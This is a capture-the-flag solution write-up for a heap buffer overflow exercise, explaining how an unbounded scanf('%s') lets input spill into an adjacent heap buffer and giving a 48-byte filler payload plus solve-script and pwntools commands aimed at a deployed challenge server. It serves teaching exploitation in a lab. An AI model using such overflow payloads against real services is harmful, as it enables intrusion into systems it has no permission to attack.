# Exercise: Overflow a Heap Buffer (heap-0) — Solution

**Tools:** nc, GDB, pwntools

This is the solving write-up, for a challenge that is already deployed.
How the challenge is built and deployed is in [`README.chall.md`](README.chall.md).
It is the first core challenge, and the twin of [`demo-heap-0`](../demo-heap-0) — same bug, a different overflow distance.

## Goal

Overflow `input_data` so it spills into `safe_var`, which wins as soon as it is no longer `"bico"`.

## The bug

`init()` allocates two adjacent heap buffers:

```c
input_data = malloc(INPUT_DATA_SIZE);   /* "pico" */
safe_var   = malloc(SAFE_VAR_SIZE);     /* "bico" */
```

`write_buffer()` copies your input into `input_data` with `scanf("%s", input_data)`, which stops at whitespace, never at the buffer size.
So a long enough write runs off the end of `input_data` and into `safe_var`, which the allocator placed right after it.
The win condition is inverted on purpose — `check_win()` prints the flag as soon as `safe_var` is anything other than `"bico"`, and nothing in the program ever assigns to it:

```c
if (strcmp(safe_var, "bico") != 0) {
        /* print the flag */
}
```

So any overwrite wins.

## Finding the overflow distance

Do not guess it. The program's *Print Heap* option prints both addresses:

```text
input_data @ 0x...2b0
safe_var   @ 0x...2e0     (difference = 0x30 = 48 bytes)
```

The gap is 48 bytes.
`INPUT_DATA_SIZE` is 32, so glibc rounds the request up to a 0x30 (48-byte) usable chunk, and `safe_var` starts 48 bytes on.
This is why the demo's 32 does not work here: the input buffer is bigger, so the neighbour is further away. Measure it.

## Solving it

All three forms do the same thing: write 48 filler bytes plus a few more (menu option 2), then print the flag (option 4).

### By hand, over nc

```console
nc 141.85.224.106 31010
```

1. Choose `1` (Print Heap) and subtract the two addresses to confirm the distance is 48.
1. Choose `2` (Write to buffer) and send 48 `A`s followed by `XXXX`:
   `AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAXXXX`
1. Choose `4` (Print Flag).

### Shell script

`solve/solve.sh` builds that input with `printf` and sends it:

```console
./solve.sh                      # against a local ./chall (uses the placeholder flag.txt)
./solve.sh 141.85.224.106 31010 # against the deployed service
```

### pwntools

`solve/exploit.py` does the same in Python, with the payload `b"A" * 48 + b"XXXX"`:

```console
python3 exploit.py                                   # local ./chall
python3 exploit.py REMOTE HOST=141.85.224.106 PORT=31010
```

## References

* `man 3 scanf` — `%s` and why it needs a field width
* `man 3 malloc` — chunk sizes and rounding
* [pwntools documentation](https://docs.pwntools.com/)
